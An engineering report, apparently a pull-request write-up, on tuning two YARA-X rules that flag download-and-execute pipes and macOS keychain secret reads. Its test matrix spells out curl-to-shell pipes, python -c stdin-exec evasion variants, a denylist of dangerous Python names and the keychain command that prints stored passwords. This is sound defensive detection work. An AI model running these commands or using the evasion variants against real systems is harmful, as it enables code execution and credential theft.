# `script_download_execute` and `macos_keychain_dump`: precision investigation (#39, decision 3)

Base: `main` `693bca1`. YARA-X `1.22.1`, Python 3.12, Linux container, disposable rules roots. The consumer trees are CyClaw `a5b5212` and cg-agent-harness `ff5df3a`, every file of 1 MB or less, 1,469 files. Nothing was executed.

Owner decision 3 says to tune real mismatches only. Fenced install commands, installers, and keychain helpers are true positives even when approved, so release is the path for them. Each match below was classified from the exact line that matched.

## `script_download_execute`: two mismatch classes, fixed

| Class | Example line | Why it is not download-and-execute |
| --- | --- | --- |
| A download piped to Python as data | `curl -s …/health \| python3 -m json.tool`; `curl … \| python3 -c 'import json,sys; print(json.load(sys.stdin)[…])'` | A fixed program reads the download; nothing downloaded runs |
| Prose naming the idiom | "not curl\|bash", "no `curl \| bash`", a table cell "`curl \| sh`", "will not `curl \| sh` unless" | No download target |

**Fixes:**
- `$shell` now needs a target word between `curl`/`wget` and the pipe, meaning a token that is not a flag or a backslash.
- A new `$shell_data` exempts the `$shell` match at the same offset in two cases: Python runs `-m json.tool`, or a one-line `-c` program whose closing quote is on the same line. The exemption applies only when that program contains nothing from `$py_danger`.
- `$py_danger` covers names that run, load, or write code (`exec`, `eval`, `compile`, `getattr`, `setattr`, `globals`, `open`, `os`, `subprocess`, `ctypes`, `importlib`, `runpy`, `code`, `builtins`), any dunder, `sys.modules`, and loaders that execute what they parse (`yaml`, `pickle`, `jsonpickle`, `dill`, `shelve`, `marshal`, `joblib`). A `-c` program that runs onto the next line is never exempt.

**Still matched (30-case direct matrix, all as expected):**
- the real `curl … install.sh | sh` and `| sudo bash` lines;
- `curl "$URL" | sh` and `curl -sK cfg | sh`;
- a pipe into a bare `python3`, `python3 -`, `-m pip`, `-m runpy`, or `perl`;
- `-c` programs that use `exec`, `eval(compile(…))`, `__import__`, `subprocess`, `os.execvp`, `getattr(__builtins__,'ex'+'ec')`, `(lambda:0).__globals__`, `yaml.load`, `open(…).write(sys.stdin.read())`, or `code.InteractiveInterpreter`;
- a multi-line `-c` program;
- a `json.tool` pipe followed on the same line by a real `| sh`.

**No longer matched:** the json.tool and JSON-printing pipes, and the four prose forms.

### Consumer trees

| Policy | `main`: clean / advisory / block | branch |
| --- | --- | --- |
| default | 1347 / 116 / 6 | 1353 / 110 / 6 |
| agent-ingest | 1347 / 0 / 122 | 1353 / 0 / 116 |
| agent-document | 1347 / 75 / 47 | 1353 / 75 / 41 |

**Cleared.** Six files went from held to clean, and none became stricter: CyClaw's `.claude/commands/status.md`, the `cyclaw-gotchas/driver.sh` and `verify-deps/SKILL.md` skill files, `.github/workflows/ci.yml`, and `docs/audits/2026-07-26-security-scan.md`, plus the harness's `scripts/smoke-ollama.sh`. Each held only lines of the two mismatch classes.

**Still held, as true positives for review or release:** eight files that carry a real install line or that exact string:
- the Ollama, rclone, and Dropbox guides;
- `setup-guide.md`, `macos/setup-from-clone.sh`, and the install-hint string in `sync/runner.py`;
- the test and fixture files that assert those strings.

## `macos_keychain_dump`: all six matches are true positives, no change

Every match runs `security find-generic-password … -w`, which prints the secret, or tells the reader to run it:
- CyClaw's README and `static/terminal.html` show the operator command that copies the API key;
- `macos/cyclaw-keychain-env.sh` and `cyclaw-keychain-set.sh` describe the `-w` read in their comments;
- the harness's `docs/INSTALL.md` and `scripts/init.sh` contain the read-back command and the `kc_get` helper.

These are approved, but they are correct detections: an agent told to run one of them would print a secret. The rule is unchanged, and these files are release candidates under decision 2.

## Checks

These all passed:
- ruff check and format, `mypy --strict src`;
- `lint_rules.py`, `check_rule_pairs.py` (two new pairs), and `check_added_rules.py` (two new cases);
- `measure_precision.py --fail-over`, `check_text_controls.py`, and `check_scan_only.py`;
- `probe_rule_coverage.py --verify --benign-stdlib`, every delivery and unix signature case still matching;
- `yara-gate selftest`.

## Limits

- **`$py_danger` is a denylist.** A Python loader not on it that executes stdin would be exempted, though the program still has to fit on one line next to a visible `curl … |`.
- **The target-word test is lexical.** `curl -s | sh` with flags and no target is not matched, but real lures always name a target.

## Codex review follow-up (831819a)

Two findings reproduced against 831819a and fixed:

- P1: `curl URL | python3 -c 'import sys;''exec(sys.stdin.read())'` was exempted, because `$shell_data` ended at the first quoted segment and `$py_danger` never saw `exec`. The `-c` argument now has to end at a boundary (end of line, space, `; & | ) < > . ,` or a closing backtick), so adjacent or escaped-quote segments keep the finding. Double-quoted programs containing `$` or a backtick are also never exempt (shell expansion).
- P2: `curl -Kcfg | sh` lost its finding because the target-word requirement did not see an attached option value. The target may now also be `-<flags>K<value>` (capital K only, so `-ks` stays prose), `--config=` or `--url=`.

Evidence (direct runs): the 30-case matrix plus 8 new cases (3 adjacent-segment variants, 4 attached-option variants, `-ks` prose) show 0 mismatches. Consumer sweep over 1,469 files shows no change from the previous branch head (a first, narrower boundary made verify-deps/SKILL.md stricter via a trailing period; widening the boundary fixed it). lint_rules, check_rule_pairs (two new pairs), check_added_rules, measure_precision --fail-over, check_text_controls and the probe with --verify --benign-stdlib all pass.
